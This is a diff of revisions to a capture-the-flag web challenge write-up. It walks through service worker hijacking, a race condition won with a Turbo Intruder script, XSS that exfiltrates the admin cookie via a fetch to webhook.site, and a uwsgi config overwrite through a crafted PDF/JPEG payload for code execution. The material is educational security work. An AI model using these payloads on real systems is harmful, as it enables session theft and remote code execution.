@@ -109,7 +109,9 @@ Applying the above, let's start with exploring the directory structure of our ap
 
 Upon inspection, there is so many files, so many routes and so many things going on compared to your typical web challenge.
 
-If we stick to our methodology, we will be able to systematically comb the application and build an effective, exploitable attack chain.
+This might be overwhelming, and many people would just decide to not continue at this point, but that should not deter us. In fact, a complex application indicates a bigger attack surface → higher chance of finding a vulnerability.
+
+Plus, we have a methodology, right? If we stick to our methodology, we will be able to systematically comb the application, find vulnerabilities, and build an attack chain.
 
 ### Dockerfile
 Let's start with the `Dockerfile`. It gives us a high-level overview of the application and how it is set up. In fact, with experience, you can somewhat predict entire attack chains by just looking at the `Dockerfile`.
@@ -627,15 +629,13 @@ let version = searchParams.get('version');
 importScripts(`${host}/workbox-cdn/releases/${version}/workbox-sw.js`)
 ```
 
-The `host` and `version` variables are passed to `sw.js` to determine which version of Google's Workbox to import using `importScripts`.
+The `host` and `version` variables are passed to `sw.js` to determine which version of Google's Workbox (some Google Service Worker script that helps with caching and other stuff) to import using `importScripts`.
 
 Importantly, `host` and `version` are extracted as the text contents of two hidden DOM elements based on their ID `#serviceWorkerHost` and `#serviceWorkerVersion` respectively.
 
-If we can inject an element with one of these ID, we will be able to **hijack** the service worker path leading to XSS.
+If we can inject an element with one of these IDs, we will be able to **hijack** the service worker path leading to XSS.
 
-Looking around for DOM sinks where we can do that, we recognize two:
-
-Let's look for DOM sinks within the app's HTML templates, we identify two such instances:
+To do that, let's look for DOM sinks within our HTML templates, luckily we identify two such instances:
 ```sh
 # _navbar.html
 <li><a href="/challenge/settings">Account Settings ({{ user['username'] | safe }})</a></li>
@@ -645,11 +645,11 @@ let note = `{{ product.note | safe }}`;
 const clean = DOMPurify.sanitize(note, {FORBID_ATTR: ['id', 'style'], USE_PROFILES: {html:true}});
 ```
 
-> In Jinja2, Flask's templating engine, the `safe` attribute does not **make** a value safe; instead, it is used to **declare** it as such, essentially telling Jinja2 to not escape the value since it is "already safe". - me
+> In Jinja2, Flask's templating engine, the `safe` attribute does not **make** a value safe; instead, it is used to **declare** a value as such, essentially telling Jinja2 to not escape the value since it is "already safe". - me
 
-We do not have access to `addItem` functionality, this eliminates the second option.
+We do not have access to the `addItem` functionality, this eliminates the second option.
 
-We are left with modifying our username, thankfully we are authorized to modify our profile settings. Additionally, the `bleach` whitelist allows us to use an `id` attribute within an `a` tag!
+We are left with the username sink, and thankfully we are authorized to modify our profile settings. Additionally, the `bleach` whitelist allows us to use an `id` attribute within an `a` tag!
 
 1. ![](sw-hijacking-1.png)
 
@@ -659,9 +659,9 @@ Our hypothesis was correct. We were able to control the `host` parameter and hij
 
 This attack is described [here](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers) as *Service Worker Hijacking via DOM Clobbering* and is a method to achieve XSS.
 
-This attack remains impossible unless we find a way to make the bot visit our own profile page. This requires making him login, then making him visit the now-his malicious page populated with our Service Worker payload, but even then, he would lose his high-privileged token upon login, so the whole sequence is pointless.
+This attack remains impossible unless we find a way to make the bot visit our own profile page.
 
-Unfortunately, this path came to a dead end.
+Essentially, for this attack to succeed, we must get the bot to login, then make him visit the now-his malicious page populated with our Service Worker payload, but even then, he would lose his high-privileged token upon login, so the whole attack sequence is pointless, let alone feasible.
 
 **References:**
 - https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/abusing-service-workers
@@ -680,12 +680,12 @@ ${alert("1")}` //
 
 ![](xss-proof.png)
 
-Since the cookie had `HttpOnly: false`, we could exfiltrate the cookie of anyone who visits the product page with a similar payload:
+Since the cookie had `HttpOnly: false`, we could theoretically exfiltrate the cookie of anyone who visits the product page with a similar payload:
 ```js
 ${fetch('https://webhook.site/REDACTED/'+btoa(document.cookie))}` //
 ```
 
-We will keep this possibility in mind.
+We will keep this in our pocket, maybe we will need it.
 
 ### Cross Side Request Forgery
 Okay, we are unable to steal the bot's cookie due to Same-origin Policy (SOP) imposed by the cookie's `SameSite` restriction, but we still got the bot to visit our attacker-controlled page, that's big, right?
@@ -723,7 +723,7 @@ Could we incite the bot to insert an XSS payload into the products page? Let's t
 	<input type="hidden" name="price" value="$9.99" />
 	<input type="hidden" name="description" value="CSRF added product..." />
 	<input type="hidden" name="imageURL" value="https://www.cakedeco.com/390562.gif" />
-	<input type="hidden" name="note" value="XSS payload" />
+	<input type="hidden" name="note" value="${alert('1')}` //" />
 	<input type="hidden" name="seller" value="aelmo" />
 </form>
 
@@ -734,7 +734,7 @@ Could we incite the bot to insert an XSS payload into the products page? Let's t
 </html>
 ```
 
-This - obviously - did not work, first because of `@antiCSRF` which requires us to have the user's `antiCSRFToken` before we can submit the form, but even if we were to leak the `antiCSRFToken` somehow, the `SameSite: Strict` cookie restriction will prevent the browser from passing the cookie (even though the form target is the cookie's issuing origin), because the request initiating origin is different.
+This - obviously - did not work, first because of `@antiCSRF` which requires us to have the user's `antiCSRFToken` before we can submit the form, but even if we were to leak the `antiCSRFToken` somehow, the `SameSite: Strict` cookie restriction will prevent the browser from passing the cookie (even though the form's target is the cookie's issuing origin), because the request initiating origin is different.
 
 Another attempt that I have tried, was attempting to fetch one of the site's pages using a basic GET request:
 ```html
@@ -762,16 +762,16 @@ Additionally, something like `credentials: include` would not work because, as i
 - https://thesecurityvault.com/understanding-cors-and-sop-bypass-techniques/
 
 ### Honorable Mentions
-`uuidv4` tokens are relied on throughout the app for confirmation tokens and CSRF tokens. Could we abuse this somehow to perform "UUIDv4 prediction"?
+`uuidv4` tokens are relied on throughout the app to generate confirmation tokens and CSRF tokens. Could we abuse this somehow to perform "UUIDv4 prediction"?
 
-Answer is no.
+Short answer is: no.
 
 The `query` call in `/login` was the only one to include an `f''` literal along the `%s` prepared statement placeholders, could this be exploited somehow?
 ```pthon
 user = query(f'SELECT * FROM users WHERE email=%s OR unconfirmedEmail=%s AND password=%s', (email, email, password, ) ,one=True)
 ```
 
-Answer is no.
+Short answer is: no.
 
 ## Chapter 5: Internal Clarity
 After so many failed attempts at elevating our privileges, we decide to establish the facts acquired so far:
@@ -789,7 +789,7 @@ This nicely illustrates what we discussed earlier about white-box testing where 
 
 Let's focus on gaining the `isInternal` privilege since everything seems to depend on it. How do we get `isInternal`?
 
-A `Ctrl+Shift+F` in the codebase for `isInternal` shows us the *only* function in the app that sets `isInternal` to `true`:
+A `Ctrl+Shift+F` (underrated tool) in the codebase for `isInternal` shows us the *only* function in the app that sets `isInternal` to `true`:
 ```python
 def verifyEmail(token):
     user = query('SELECT * from users WHERE confirmToken = %s', (token, ), one=True)
@@ -808,19 +808,24 @@ def verifyEmail(token):
     return False
 ```
 
-`database.py/verifyEmail` is responsible for verifying our emails.
+`database.py/verifyEmail` is the function responsible for verifying our emails.
 
-However, `verifyEmail` has an interesting condition: if an email is within the `apexsurvive.htb`  domain, it is considered to be internal and is given the `isInternal` privilege on verification.
+However, `verifyEmail` contains an interesting condition: if an email is within the `apexsurvive.htb`  domain, it is considered to be internal and is given the `isInternal` privilege upon verification.
 
-A quick check shows us that we can register any email we want. There is no checks on registration or even profile updates, which is realistic; however, similar to a real application, we would be unable to verify our email since we do not have access to an `@apexsurvive.htb` inbox.
+A quick check shows us that we actually can register any email we want. There is no checks on registration or even profile updates, which mimics a real-life application; however, just like in real applications, we would be unable to verify our arbitrarily-picked email since we do not have access to its inbox.
+
+That's literally why we have email verification, to prove ownership of a claimed email.
 
 ### parseaddr and RFC2822
-I suspected the `parseaddr` function since its output was relied on for the check, a search yielded very interesting stuff on a recent `parseaddr` vulnerability that could result in an authentication bypass, **CVE-2023-27043**:
+I suspected the `parseaddr` function was involved, since its output was the primary arbiter of the hostname. The whole check was based on `parseaddr`'s output.
 
+A quick search yielded very interesting stuff on a recent `parseaddr` vulnerability that could result in an authentication bypass, **CVE-2023-27043**:
+
+The CVE reads:
 > "The email module of Python through 3.11.3 incorrectly parses e-mail addresses that contain a special character. The wrong portion of an RFC2822 header is identified as the value of the addr-spec. In some applications, an attacker can bypass a protection mechanism in which application access is granted only after verifying receipt of e-mail to a specific domain (e.g., only @company.example.com addresses may be used for signup). This occurs in email/_parseaddr.py in recent versions of Python."
 > - https://nvd.nist.gov/vuln/detail/CVE-2023-27043
 
-Our docker instance is running Alpine `3.14.1` which has `Python 3.9.17`, confirming that `parseaddr` is most likely vulnerable.
+Our docker instance is running Alpine `3.14.1` which has `Python 3.9.17`, confirming that `parseaddr` most likely is vulnerable.
 
 The vulnerability says that if we control the address' realname, we get to control the hostname.
 
@@ -862,7 +867,7 @@ $ check.py 'hacker@apexsurvive.htb]<test@email.htb>'
 parseaddr res: ('', 'hacker@apexsurvive.htb')
 # a compliant parser should return this:
 # ('hacker@apexsurvive.htb]', 'test@email.htb')
-# instead; according to RFC2822
+# according to RFC2822
 ==================
 regex did NOT pass
 parse result: ('hacker', 'apexsurvive.htb')
@@ -870,9 +875,9 @@ hostname: apexsurvive.htb
 ```
 
 While the idea is not so bad in essence - according to unbiased me 😅 - it ended up failing for many reasons:
-- Research showed that `flask-mail`, `smtplib` and Python's `MailHog` all make use of `parseaddr` under the hood, so they all share the parsing discrepancy.
-- `@sanitizeInput` would escape `< >` required in this parsing vulnerability
-- The `checkEmail` regex-based check would prevent any bypass anyways.
+- Further research showed that `flask-mail`, `smtplib` and Python's `MailHog` all make use of `parseaddr` under the hood, so they all share the parsing discrepancy.
+- `@sanitizeInput` would escape `< >` required in this parsing vulnerability anyways.
+- The `checkEmail` regex-based check would prevent address manipulation anyways.
 
 Original CPython issue:
 - https://github.com/python/cpython/issues/102988
@@ -993,7 +998,7 @@ And while a shot in the dark could work sometime, we do not want to rely on chan
 
 This *illumination* can be done through modelling and experimentation or via secondary research.
 
-I started to learn more about race conditions.
+I started to read about race conditions.
 
 From [Hack Tricks](https://book.hacktricks.xyz/pentesting-web/race-condition):
 > "The main hurdle in taking advantage of race conditions is making sure that multiple requests are handled at the same time, with very little difference in their processing times—ideally, less than 1ms."
@@ -1010,9 +1015,9 @@ Reading through the predictors of a collision, our problem seems to check all th
 - [x] We are editing a record, rather than appending.
 - [x] The two racing operations are keyed on a fixed column, `id`!
 
-I think I devoured that entire article, it is very concise, on-point and masterpiece to be honest. It was not just extremely relevant to our app, it also beautifully demonstrated how to reason about and approach race conditions or any time-sensitive vulnerability in general.
+I think I devoured that entire article, it is very concise, on-point and a total masterpiece if I am being honest. Not only was it extremely relevant for our app, it was also to provide a framework for discovering, reasoning about and approaching race conditions and any time-sensitive vulnerability in general.
 
-A very important section explained Kettle's RC finding in Devise, a popular authentication framework in the Ruby ecosystem:
+A very important section explained Kettle's race condition finding in Devise, a popular authentication framework in the Ruby ecosystem:
 ![](devise-rc.png)
 
 The similarity is so stark, down to variable names, and I cannot help but think the challenge author must have taken some inspiration from this exact article.
@@ -1033,9 +1038,9 @@ def sendVerification(decodedToken):
 
 Let's also added debug points to all critical functions to see the precise execution timeline of our race condition.
 
-Then I attempted to manually trigger the race condition, starting with `test@email.htb`, triggering `sendVerification`, then updating email to `hacker@apexsurvive.htb` within the sleep duration, before the email is sent.
+I then attempted to manually trigger the race condition, setting initial state to use `test@email.htb`, triggering `sendVerification`, then updating email to `hacker@apexsurvive.htb` within the sleep duration, before the email is sent.
 
-In the logs, everything went exactly as our planned:
+In the logs, everything went exactly as our annotated timeline above:
 ```sql
 15:15:46.811049 [+] /sendVerification: Entered
 15:15:46.811753 [+] sendVerification grabbed user {'id': 2, 'email': None, 'password': 'password', 'unconfirmedEmail': 'test@email.htb', 'confirmToken': 'e3ab2f88-385c-4b4f-aef0-d9aa94cf81d7', 'fullName': 'aaa', 'username': 'bbb', 'isConfirmed': 'unverified', 'isInternal': 'false', 'isAdmin': 'false'} 
@@ -1055,7 +1060,7 @@ In the logs, everything went exactly as our planned:
 15:15:51.818532 [+] sendEmail: Actually sending email now...
 ```
 
-But looking at our inbox, nothing happens. The email that gets sent to us contains `test@email.htb` and his token. What?!
+But looking at our inbox, nothing happens. The email sent to us is typical, containing `test@email.htb` and its token. What?!
 
 Shouldn't `sendEmail: Querying token...` at `15:15:51.81` be querying the newly generated token `696a019c-e4d2-4457-b53b-d73b6605463b`?
 
@@ -1063,9 +1068,9 @@ How is the old token, which should have been overwritten in the database at `15:
 
 This, I have no answer for.
 
-I suspect it is something to do with MariaDB transactions or perhaps related to the way `sleep` works. Either way, I found this behavior perplexing. If someone has an explanation, please let me know in the comments.
+I suspect it is something to do with MariaDB transactions, it might be related to the way `sleep` works, or perhaps I misidentified the race condition's critical region. Either way, I found this behavior perplexing. If someone has an explanation, please let me know in the comments.
 
-I tried to automate this process using `threading`, looked up samples using `aiohttp` and `asyncio`, but to no avail, same result.
+Next, I tried to automate this process using `threading`, maybe the manual approach was not fast enough? It shouldn't have to be fast anyways since we added a sleep there. Anyways, I still looked up samples using `aiohttp` and `asyncio` for concurrency, but to no avail, same result.
 
 ### Winning the Race
 Few more hours passed and I am still staring at the same code. I know there is a race condition, I am just unable to exploit it.
@@ -1079,14 +1084,14 @@ The problem with this method is, it does not eliminate server-side jitter. In ou
 > "I spotted an opportunity to adapt a trick from the HTTP/1.1 'last-byte sync' technique. Since servers only process a request once they regard it as complete, maybe by withholding a tiny fragment from each request we could pre-send the bulk of the data, then 'complete' 20-30 requests with a single TCP packet"
 > - James Kettle, Smashing the state machine
 
-From the same article, turns out we could perform a last-byte sync attack using **Turbo Intruder**, a Burp Suite plugin written by Kettle himself.
+From the same article, turns out we could perform a last-byte sync attack using **Turbo Intruder**, a Burp Suite extension written by Kettle himself.
 
-> I later learnt that this feature is available in **Repeater** where you could group multiple requests before sending them in parallel.
+> I later found that this feature is available in good ol' **Repeater** where you could group multiple requests before sending them in parallel. - me
 
 So, let's send a request over to Turbo Intruder:
 ![](turbo-intruder-send.png)
 
-With a bit of experimentation, I wrote a script based off Turbo Intruder's `race-multi-endpoint` example:
+With a bit of experimentation, I wrote a script based off Turbo Intruder's `race-multi-endpoint` preset:
 ```python
 def queueRequests(target, wordlists):
 
@@ -1152,9 +1157,9 @@ Out of 10 race condition attempts, we had 3 successful hits where a token intend
 
 Now, these verification tokens are not usable because they got superseded by failed attempts, this means we must stop on success to preserve elevated tokens.
 
-This is doable manually since hit chance is pretty high and I don't think it would be hard to automate it either.
+This is doable manually since hit chance is pretty high, but I don't think it would be hard to automate it either.
 
-Anyways, we won the race, let's keep going.
+Anyways, we are now certain that we can win the race. We did it.
 
 ## Chapter 6: The Attack Chain
 With the race condition completed, let's look at our new attack chain:
@@ -1162,7 +1167,7 @@ With the race condition completed, let's look at our new attack chain:
 
 We should be able to reach admin easily now.
 
-Starting with a normal user, we run our RC payload manually, one-by-one until we get a hit:
+Starting with a normal user, we run our race condition payload manually, one-by-one until we get a hit:
 ![](inbox-apexsurvive-single.png)
 
 We then verify our email to unlock the **Internal Settings**
@@ -1171,20 +1176,24 @@ We then verify our email to unlock the **Internal Settings**
 We then enter a poisoned product into the system:
 ![](xss-product-add.png)
 
-... and submit it to the admin bot:
+... and submit it for review by the admin bot:
 ![](xss-product-reported.png)
 
-A few seconds pass, and we receive the exfiltrated admin cookie:
+A few seconds pass, then we receive the exfiltrated admin cookie:
 ![](webhook-admin-cookie.png)
 
 We hijack the admin session and unlock **Admin Settings**
 ![](admin-contract.png)
-Also notice our admin username: `Xclow3n`.
+Also notice our new, admin username: `Xclow3n`.
 
-The next goal is RCE, but how?
+We are now admin. The next goal is RCE, but how?
 ![](attack-chain-admin.png)
 
-Let's check the `/addContract` logic:
+With our newly-acquired privileges, let's reevaluate our new building blocks. Remember our methodology pep-talk earlier?
+
+We have one new endpoint exclusively available to admin users: `/addContract`
+
+Let's give it some scrutiny:
 ```python
 @api.route('/addContract', methods=['POST'])
 @isAuthenticated
@@ -1232,10 +1241,10 @@ os.path.join(current_app.root_path, 'contracts', uploadedFile.filename)
 
 ```python
 os.path.join('/root/directory1/app/', 'contracts', '/file.txt')
-'/file.txt'
+'/file.txt'                      # we control this --^
 ```
 
-Before our AFW code, the uploaded file gets saved to `/tmp/temporaryUpload` and a function, `checkPDF()`, is called. Let's see what `checkPDF()` does:
+There is catch though: before our AFW vulnerable code gets hit, the uploaded file gets saved to `/tmp/temporaryUpload` and a function, `checkPDF()`, is called. Let's see what `checkPDF()` does:
 ```python
 def checkPDF():
     try:
@@ -1247,28 +1256,28 @@ def checkPDF():
     return True
 ```
 
-It's a simple function that checks if our uploaded file is a correct, parseable PDF document using `PdfReader` from `PyPDF2` in strict mode.
+It's a simple function that checks if our uploaded file is a correct, parseable PDF document by feeding it to `PdfReader` from `PyPDF2` in strict mode.
 
 I did some digging around but the function seems secure. There seems to be no way around uploading a valid PDF.
 
-This restricts us to an **Arbitrary PDF Write** if we may say.
+This turn of events restricts us to an **Arbitrary PDF Write** if we may say.
 
 After some googling, searching for `uwsgi file write pdf rce` yielded this [interesting piece](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
 
 The article uses two "features" of `uwsgi` to turn arbitrary file write into code execution.
-1. `uwsgi` is very flexible when reading its own config files. It scans the configuration file for `[uwsgi]` and reads configuration from there.
-2. `uwsgi` config syntax allows for magic `@` operators, these provides convenient file reading, command execution and other powerful stuff.
+1. `uwsgi` is very flexible when reading its own config files. It scans the configuration file for `[uwsgi]` and reads configuration from there even if its a binary.
+2. `uwsgi`'s config syntax allows for magic `@` operators, these provide convenience utilities such as file reading and, you guessed it, command execution.
 
-Thanks `uwsgi`.
+We love you, `uwsgi`.
 
-The article suggest embedding the weaponized `uwsgi` command within a JPEG metadata, packaging that in a PDF, then using that PDF as a payload.
+The same article suggests embedding the weaponized `uwsgi` configuration within a JPEG as metadata, packaging that in a PDF, then the final PDF would be your payload.
 
-They kindly provide a proof-of-concept as well. Let's get to work
+They kindly provided a proof-of-concept as well. Let's get to work
 
-We set up our listeners:
+We set up our listeners, I usually use `ngrok` to obtain a publicly accessible TCP endpoint:
 ![](listener-setup.png)
 
-Let's weaponize an innocent `flower.jpg`, notice how the payload pads the JPEG metadata with newlines:
+Let's weaponize an innocent `flower.jpg`, notice how the payload pads the JPEG metadata with newlines (these are the `&#x0a;` sequences on either side):
 ```python
 from fpdf import FPDF
 from exiftool import ExifToolHelper
@@ -1290,23 +1299,22 @@ pdf.image('./flower.jpg')
 pdf.output('payload.pdf', 'F')
 ```
 
-Payload generation screenshot for extra immersion:
 ![](gen-pdf.png)
 
-This is our payload, can't be malicious, right?
+Finally, this is our payload, can't be malicious, right?
 ![](pdf-payload.png)
 
-We upload the request through Repeater, setting the filename to `/app/uwsgi.ini` to overwrite `uwsgi`'s config file:
+We upload the request through Repeater, setting the filename to `/app/uwsgi.ini` to overwrite `uwsgi`'s current config file:
 ![](repeater-pdf-rce.png)
 
-Notice how the image metadata (with our `uwsgi` command) are stored as plaintext within the otherwise encoded PDF.
+Notice how the image metadata (with our `uwsgi` command) are stored as plaintext within the otherwise encoded PDF; that's because we embedded them inside a JPEG which mainly serves to protect our payload from PDF's compression and encoding features as far as I understand.
 
 To trigger the command, we must reload `uwsgi` by modifying a python source file within the application, this is a debug feature enabled in the currently loaded `uwsgi.ini` through:
 ```
 py-autoreload = 3
 ```
 
-Let's just overwrite any file say `/app/application/database.py`, sending our request and...
+For that, we will just overwrite any file say `/app/application/database.py`. We send our request and...
 ![](flag.png)
 
 `HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}`
@@ -1323,15 +1331,15 @@ It was a mental game more than anything else, me versus a piece of logic.
 
 At some point, and through a game of elimination, I reached a strong conviction that the only route has to be through `isInternal`.
 
-Again, and through a long-winded game of elimination, I reached a conviction that the only way to get `isInternal` is a race condition. I got fixated on the race condition, then I pulled it off.
+Next, and through another long-winded game of elimination, I reached a conviction that the only way to get `isInternal` is through a race condition. I got fixated on the race condition, then I pulled it off.
 
-Visual proof of a late-night conviction 😅: 
+Visual proof of my somewhat late-night conviction as I explained the situation to my team 😅: 
 ![](discord.png)
 
 On a second note, there was so much tangential research that I have not included in this writeup, but that does not mean it was useless. The most rewarding aspect of CTFs are these little, educational journeys you take doing seemingly irrelevant, tangential research.
 
 CTF after CTF and challenge after challenge, you realize you have accumulated a good variety of information, about seemingly random things, and evidently, that variety is what creates a resourceful, solid cybersecurity engineer.
 
-Also big thanks to my team **PwnSec** for the support, it was beautiful to see the team effort as we collaborated on different categories.
+Big thanks to my team **PwnSec** for their support, it was beautiful to see the team effort as we collaborated on different categories.
 
-That's all I got for today, see you in the next one.
+That's all I got for today, if you made it this far, you deserve a handshake 🤝. See you in the next one 🤍
